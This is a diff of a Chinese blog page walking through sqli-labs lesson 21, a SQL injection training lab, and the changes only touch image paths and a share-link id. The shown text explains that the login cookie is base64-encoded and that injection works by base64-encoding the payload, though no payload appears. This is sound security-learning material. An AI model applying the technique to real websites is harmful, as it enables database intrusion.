         <p>这关虽然和lesson18很像，但是还是有很多东西值得开一篇新的blog。</p>
 <h2 id="lesson21："><a href="#lesson21：" class="headerlink" title="lesson21："></a>lesson21：</h2><p>首先输入正确的用户名，密码，用burp抓包：</p>
-<p><img src="/2021/02/03/lesson21-22/1.png" alt="1"></p>
+<p><img src="/lesson21/1.png" alt="1"></p>
 <p>我们看到cookie一行的uname=被加密了，我们查看源码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600);	</span><br></pre></td></tr></table></figure>
 
@@ -993,9 +993,9 @@
 <p>cookie 的名称自动指定为相同名称的变量。例如，如果被发送的 cookie 名为 “user”，则会自动创建一个名为 $user 的变量，包含 cookie 的值。</p>
 <p>必须在任何其他输出发送到客户端前对 cookie 进行赋值。</p>
 <p>如果成功，该函数返回 TRUE。如果失败则返回 FALSE。</p>
-<p><img src="/2021/02/03/lesson21-22/2.png" alt="2"></p>
+<p><img src="/lesson21/2.png" alt="2"></p>
 <p>因此我们可以看到cookie的值被加密了。接着看源码：</p>
-<p><img src="/2021/02/03/lesson21-22/3.png" alt="3"></p>
+<p><img src="/lesson21/3.png" alt="3"></p>
 <p>至此，我们可以确信还是从cookie进行注入，不过要将payload进行base64加密。</p>
 <p>在线编译网站：<a target="_blank" rel="noopener" href="https://tool.oschina.net/encrypt?type=3">https://tool.oschina.net/encrypt?type=3</a></p>
 <p>那么开始注入吧！</p>
@@ -1006,7 +1006,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/03/lesson21-22/" data-id="ckozphtuq002vzsvugzip9l3u" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/03/lesson21-22/" data-id="ckr0oba3b002li8vu94po0gr3" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
